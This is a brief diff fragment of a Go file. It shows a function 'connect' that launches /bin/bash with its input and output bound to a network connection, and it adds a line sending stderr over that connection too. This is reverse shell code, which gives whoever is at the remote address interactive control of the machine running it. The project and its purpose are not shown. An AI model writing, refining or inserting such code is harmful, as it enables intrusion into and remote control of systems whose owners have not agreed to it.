@@ -99,6 +99,7 @@ func connect(addr string) (err error) {
 	cmd := exec.Command("/bin/bash")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
+	cmd.Stderr = conn
 	err = cmd.Run()
 	if err != nil {
 		return err
